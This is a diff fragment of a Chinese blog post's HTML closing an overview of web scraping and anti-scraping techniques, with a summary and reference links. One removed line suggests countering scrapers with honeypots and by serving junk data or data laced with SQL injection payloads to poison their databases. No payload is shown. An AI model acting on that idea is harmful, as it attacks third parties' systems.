-<p>甚至可以做一些”反制”，比如<a target="_blank" rel="noopener" href="https://www.cnblogs.com/index-html/p/frontend-based-war.html">对抗假人 —— 前后端结合的 WAF</a>提到通过”脱壳迷惑”、”蜜罐钓鱼”等来消耗”爬虫工程师”的时间资源，再比如爬虫数据最终都要存储，或许可以制造垃圾数据或者带sql注入payload的数据。</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文粗略地对”爬虫”和”反爬”手段做了一些分类。后面文章我会讲述”反爬”手段的一些细节和案例。</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/146490073-049890c8-b45d-42d4-a337-00ac10251822.png" alt="数据流"></p>
-<p>另外我在调研中觉得有些资料还不错，放到了<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/5aad51fff569308748370dcf1609bc1c">gist</a>，你也可以看看。</p>
 
       
     </div>
